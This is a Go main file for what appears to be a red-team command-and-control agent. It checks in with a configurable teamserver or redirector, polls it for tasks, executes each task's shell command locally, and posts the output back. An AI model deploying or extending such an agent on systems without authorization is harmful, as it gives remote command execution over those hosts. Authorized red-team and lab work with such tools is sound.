package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"infrared/agent-go/internal/client"
	"infrared/agent-go/internal/config"
	"infrared/agent-go/internal/runner"
)

func main() {
	os.Exit(run())
}

func run() int {
	configPath := flag.String("config", "configs/local-http-basic.json", "agent configuration path")
	serverURL := flag.String("server-url", "", "override configured teamserver or redirector URL")
	agentID := flag.String("agent-id", "", "override configured agent ID")
	pollInterval := flag.Int("poll-interval", 0, "override configured poll interval in seconds")
	once := flag.Bool("once", false, "check in, poll once, then exit")
	flag.Parse()

	cfg, err := config.Load(*configPath)
	if err != nil {
		log.Printf("config error: %v", err)
		return 2
	}
	if *serverURL != "" {
		cfg.ServerURL = *serverURL
	}
	if *agentID != "" {
		cfg.AgentID = *agentID
	}
	if *pollInterval != 0 {
		cfg.PollIntervalSeconds = *pollInterval
	}
	if err := cfg.Validate(); err != nil {
		log.Printf("config error: %v", err)
		return 2
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	api := client.New(cfg.ServerURL, time.Duration(cfg.TimeoutSeconds)*time.Second)
	executor := runner.New()

	if err := checkIn(ctx, api, cfg); err != nil {
		log.Printf("check-in failed: %v", err)
		return 1
	}

	for {
		if err := pollAndRun(ctx, api, executor, cfg.AgentID); err != nil {
			log.Printf("poll cycle failed: %v", err)
			if *once {
				return 1
			}
		}

		if *once {
			return 0
		}

		select {
		case <-ctx.Done():
			log.Println("agent stopped")
			return 0
		case <-time.After(time.Duration(cfg.PollIntervalSeconds) * time.Second):
		}
	}
}

func checkIn(ctx context.Context, api *client.Client, cfg config.Config) error {
	info, err := client.LocalAgentInfo(cfg)
	if err != nil {
		return err
	}
	session, err := api.CheckIn(ctx, info)
	if err != nil {
		return err
	}
	log.Printf("checked in: agent_id=%s session_id=%s", session.AgentID, session.SessionID)
	return nil
}

func pollAndRun(ctx context.Context, api *client.Client, executor runner.Executor, agentID string) error {
	tasks, err := api.Tasks(ctx, agentID)
	if err != nil {
		return err
	}
	if len(tasks) == 0 {
		log.Println("no pending tasks")
		return nil
	}

	for _, task := range tasks {
		log.Printf("running task_id=%d command=%q", task.TaskID, task.Command)
		result := executor.Run(ctx, task.Command)
		payload := client.ResultPostRequest{
			TaskID:   task.TaskID,
			Stdout:   result.Stdout,
			Stderr:   result.Stderr,
			ExitCode: result.ExitCode,
			Status:   result.Status,
		}
		if _, err := api.PostResult(ctx, agentID, payload); err != nil {
			return fmt.Errorf("post result for task %d: %w", task.TaskID, err)
		}
		log.Printf("posted result: task_id=%d status=%s exit_code=%d", task.TaskID, result.Status, result.ExitCode)
	}
	return nil
}
